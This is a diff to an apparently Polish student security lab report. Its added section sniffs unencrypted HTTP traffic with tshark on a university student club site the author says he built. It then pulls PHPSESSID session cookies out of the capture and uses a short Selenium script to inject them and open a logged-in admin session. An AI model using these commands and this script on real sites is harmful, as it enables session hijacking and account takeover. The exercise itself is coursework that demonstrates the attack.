@@ -38,5 +38,47 @@ Zarówno lista witryn jak protokołów zawiera się w [tabelce](./packages.md) w
 Mapa lokalizacji z którymi łączyli się użytkownicy została wygenerowana przy pomocy programu `Visual Traceroute`. Przykładowe screeny poniżej. Pozostałe zrzuty znajdują się w katalogu `./traceroute/`.
 
 ![tr1](./traceroute/focus.png)
+
 ![tr2](./traceroute/googl.png)
+
 ![tr3](./traceroute/krupski.png)
+
+## Zadanie 2
+
+Zadanie zrobiłem wykorzystując stronę mojego koła naukowego (którą zresztą napisałem), ponieważ stoi na serwerach Politechniki, które są nieszyfrowane. 
+
+Do wyekstrachownaia plików cookies użyłem programu `tshark`
+
+`sudo tshark -i wlp3s0 -w out.pcap`
+
+Plik wyjściowy znajduje się [tutaj](./out.pcap).
+
+Możemy znaleźć cookies potrzebne nam do podszycia się pod innego użytkownika:
+
+```
+ $sed /Cookie/q out.pcap
+
+Cookie: PHPSESSID=7ef0ed1eba86f4dac4352078e47d59a1; PHPSESSID=u0ijuhl7phjmqh0s9mtq2cguk5
+```
+
+Po wyekstrachowaniu cookies, użyłem skryptu napisanego w Pythonie:
+
+```
+import selenium.webdriver
+driver = selenium.webdriver.Chrome('./chromedriver')
+driver.get("http://www.solvro.pwr.edu.pl/admin.php")
+cookies = [
+	{'domain': 'www.solvro.pwr.edu.pl', 'name': 'PHPSESSID', 'value': '7ef0ed1eba86f4dac4352078e47d59a1'},
+	{'domain': '.pwr.edu.pl', 'name': 'PHPSESSID', 'value': 'u0ijuhl7phjmqh0s9mtq2cguk5'},
+	]
+
+for cookie in cookies:
+    driver.add_cookie(cookie)
+
+for cookie in driver.get_cookies():
+    print ((cookie['name'], cookie['value']))
+```
+
+wykorzstującego `Selenium` i `chromewebdriver`. Po umieszczeniu cookies i odpaleniu skryptu, wyswietla się panel logowaniu, natomiast po przeładowaniu strony, zostajemy przeniesieni do sesji zalogowanego użytkownika, jak pokazano na zrzucie poniżej:
+
+![session](./session.png)
